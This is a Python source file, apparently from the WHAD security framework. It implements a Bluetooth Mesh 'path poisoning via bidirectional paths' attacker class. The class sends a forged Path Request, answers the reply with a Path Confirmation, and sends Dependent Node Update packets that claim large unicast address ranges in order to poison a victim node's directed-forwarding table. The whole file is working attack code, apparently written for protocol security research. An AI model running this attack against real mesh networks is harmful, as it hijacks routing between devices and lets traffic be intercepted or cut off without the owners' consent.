"""
Attacker object for the Bluetooth Mesh path poisoning via bidirectional paths (A3)
"""

import logging

from dataclasses import dataclass, field
from whad.btmesh.attacker import Attacker
from whad.scapy.layers.btmesh import (
    BTMesh_Upper_Transport_Control_Path_Request,
    UnicastAddr,
    BTMesh_Upper_Transport_Control_Path_Reply,
    BTMesh_Upper_Transport_Control_Dependent_Node_Update,
    BTMesh_Upper_Transport_Control_Path_Confirmation,
)
from whad.btmesh.stack.utils import MeshMessageContext
from whad.btmesh.stack.constants import DIRECTED_FORWARDING_CREDS

from time import sleep
from random import uniform
from threading import Thread, Event
from copy import copy

logger = logging.getLogger(__name__)


@dataclass
class PathPoisonBidirConfiguration:
    """Configuration for the PathPoisonBidir attack

    :param victim: The address of the victim node to poison. Ideally Configuration Manager.
    :param path_origin: The source address to use for the Path Origin of the poisoned path. If None, local nodes's primary address used.
    :param forwarding_number: The forwading_number to use for the path. If None, local node's forwading_number used (increment auto).
    :param low_address_range: The low bound for the range of addresses to add the the dependent nodes.
    :param high_address_range: The high bound for the range of addresses to add the the dependent nodes.
    :param net_key_index: The net_key_index to use to send the control messages.
    """

    victim: int = 0x0005
    path_origin: int | None = 0x0002
    forwarding_number: int | None = 0
    low_address_range: int = 0x0001
    high_address_range: int = 0x010F
    net_key_index: int = 0


class PathPoisonBidirAttacker(Attacker):

    name = "PathPoisonBidir"
    description = "Tries to poison DF paths via a bidirectional path poisoned. (A3)"
    need_provisioned_node = True

    def __init__(self, connector, configuration=PathPoisonBidirConfiguration()):
        """PathPoisonBidirAttacker object. Requires a provisioned node.

        For now, source address on Network layer is local's node primary address for simplicity.

        :param connector: The btmesh connector to use
        :type connector: BTMesh
        :param configuration: The configuration to use
        :type configuration: LinkCloserConfiguration
        """

        # Event to notify _attack_runner that we finished sending all BTMesh_Upper_Transport_Control_Dependent_Node_Update messages
        self._attack_finished_event = Event()

        super().__init__(connector, configuration)

    def _setup(self):
        """
        Setup the Upper Transport layer for the attack.
        """
        self._connector.stop()
        upper_transport = self._connector.main_stack.get_layer("upper_transport")
        upper_transport.register_custom_handler(
            BTMesh_Upper_Transport_Control_Path_Reply, self.on_path_reply
        )  # register our attack_callback in in upper_transport layer
        self._attack_finished_event.clear()
        self._connector.start()
        self._is_setup = True

    def restore(self):
        """
        Restores the Upper Transport layer back to normal.
        """
        if self._is_setup:
            self._connector.stop()
            upper_transport = self._connector.main_stack.get_layer("upper_transport")
            upper_transport.unregister_custom_hanlder(
                BTMesh_Upper_Transport_Control_Path_Reply
            )
            self._connector.start()
            self._is_setup = False

    def _attack_runner(self):
        self._is_attack_running = True

        # Check validity of parameters
        if (
            self._connector.profile.get_net_key(self._configuration.net_key_index)
            is None
        ):
            self._success = False
            self.is_attack_running = False
            return

        if self._configuration.path_origin is None:
            self._configuration.path_origin = (
                self._connector.profile.get_primary_element_addr()
            )

        if self._configuration.forwarding_number is None:
            forwarding_number = self._connector.profile.get_next_forwarding_number()
        else:
            forwarding_number = self._configuration.forwarding_number

        pkt = BTMesh_Upper_Transport_Control_Path_Request(
            on_behalf_of_dependent_origin=0,
            path_origin_path_metric_type=0,
            path_discovery_interval=0,
            path_origin_path_lifetime=2,
            path_origin_path_metric=0,
            path_origin_forwarding_number=forwarding_number,
            destination=self._configuration.victim & 0xFFFF,
            path_origin_unicast_addr_range=UnicastAddr(
                range_start=self._configuration.path_origin & 0x7FFF
            ),
        )

        ctx = MeshMessageContext()
        ctx.creds = DIRECTED_FORWARDING_CREDS
        ctx.src_addr = self._connector.profile.get_primary_element_addr()
        ctx.dest_addr = 0xFFFB  # all directed forwarding nodes
        ctx.ttl = 0
        ctx.is_ctl = True
        ctx.net_key_id = self._configuration.net_key_index

        """
        key = str(pkt.path_origin_unicast_addr_range.range_start) + str(
            pkt.path_origin_forwarding_number
        )
        self.path_requests_processed[key] = (pkt, ctx)
        """

        upper_transport = self._connector.main_stack.get_layer("upper_transport")

        upper_transport.send_control_message(
            (
                pkt,
                ctx,
            )
        )

        # Wait for the BTMesh_Upper_Transport_Control_Path_Reply to be received and the BTMesh_Upper_Transport_Control_Dependent_Node_Update to be sent by attacker
        self._attack_finished_event.wait(timeout=10)
        self._is_attack_running = False
        return self._success

    def launch(self, asynch=False):
        """
        Launches the PathPoisonBidir attack. synch is advised

        :param asynch [TODO:type]: [TODO:description]
        """
        super().launch(asynch=asynch)

    def on_path_reply(self, message):
        """
        Handler of a BTMesh_Upper_Transport_Control_Path_Reply message from our attack.
        Proceeds with the poisoning of the victim's forwarding table.

        :param message [TODO:type]: [TODO:description]
        """
        pkt, ctx = message
        if self._configuration.path_origin == pkt.path_origin:
            # If not confirmation_request, attack failed
            if pkt.confirmation_request != 1:
                self._success = False
                self._attack_finished_event.set()
                return False

            resp_pkt = BTMesh_Upper_Transport_Control_Path_Confirmation(
                path_origin=pkt.path_origin,
                path_target=pkt.path_target_unicast_addr_range.range_start,
            )
            resp_ctx = MeshMessageContext()
            resp_ctx.creds = DIRECTED_FORWARDING_CREDS
            resp_ctx.src_addr = self._connector.profile.get_primary_element_addr()
            resp_ctx.dest_addr = 0xFFFB
            resp_ctx.ttl = 0
            resp_ctx.is_ctl = True
            resp_ctx.net_key_id = self._configuration.net_key_index
            sleep(0.2)

            
            upper_transport = self._connector.main_stack.get_layer("upper_transport")
            upper_transport.send_control_message((resp_pkt, resp_ctx))

            """
            # update credentials for echo reply
            key = str(pkt.path_origin) + str(
                pkt.path_target_unicast_addr_range.range_start
            )
            self.path_echo_reply_list[key] = (None, DIRECTED_FORWARDING_CREDS)
            """

            dep_pkts = self._get_dependent_node_update_packets()
            for dep_pkt in dep_pkts:
                sleep(0.2)
                dep_ctx = copy(resp_ctx)
                upper_transport.send_control_message((dep_pkt, dep_ctx))

            self._success = True
            self._attack_finished_event.set()
            return False

    def show_result(self):
        """Function implemented in each Attacker to display the result of the attack"""
        if self._is_attack_running:
            print("The PathPoisonBidir attack is still runnning asynchnously.")
        elif self._success:
            print(
                "The PathPoisonBidir attack was probably a success, need to check the poisoning by checking forwarding table or sending messages from the victim."
            )
        else:
            print(
                "PathPoisonBidir attack did not run once or failed. Messages might have not been received or the victim does not support DF/bidirectional paths"
            )

    def _get_dependent_node_update_packets(self):
        """Based on the configuration (path_origin address, low_address_range, high_address_range), this function returns a list of BTMesh_Upper_Transport_Control_Dependent_Node_Update packets to poison like wanted.

        :returns: The list of BTMesh_Upper_Transport_Control_Dependent_Node_Update to send to the victim
        :rtype: list[BTMesh_Upper_Transport_Control_Dependent_Node_Update]
        """
        low = self._configuration.low_address_range
        high = self._configuration.high_address_range

        # if data incoherent, we just poison with one packet from 0x0001 to 0x00FF
        if low >= high:
            return [
                BTMesh_Upper_Transport_Control_Dependent_Node_Update(
                    type=1,
                    path_endpoint=self._configuration.path_origin,
                    dependent_node_unicast_addr_range=UnicastAddr(
                        range_start=0x0001, length_present=1, range_length=0xFF
                    ),
                )
            ]

        packets = []

        for range_start in range(low, high + 1, 255):
            end = min(range_start + 254, high)  # ensure we don't exceed the high bound
            range_length = end - range_start + 1

            if range_length == 1:
                packets.append(
                    BTMesh_Upper_Transport_Control_Dependent_Node_Update(
                        type=1,
                        path_endpoint=self._configuration.path_origin,
                        dependent_node_unicast_addr_range=UnicastAddr(
                            range_start=range_start, length_present=0
                        ),
                    )
                )
            else:
                packets.append(
                    BTMesh_Upper_Transport_Control_Dependent_Node_Update(
                        type=1,
                        path_endpoint=self._configuration.path_origin,
                        dependent_node_unicast_addr_range=UnicastAddr(
                            range_start=range_start,
                            length_present=1,
                            range_length=range_length,
                        ),
                    )
                )

        return packets
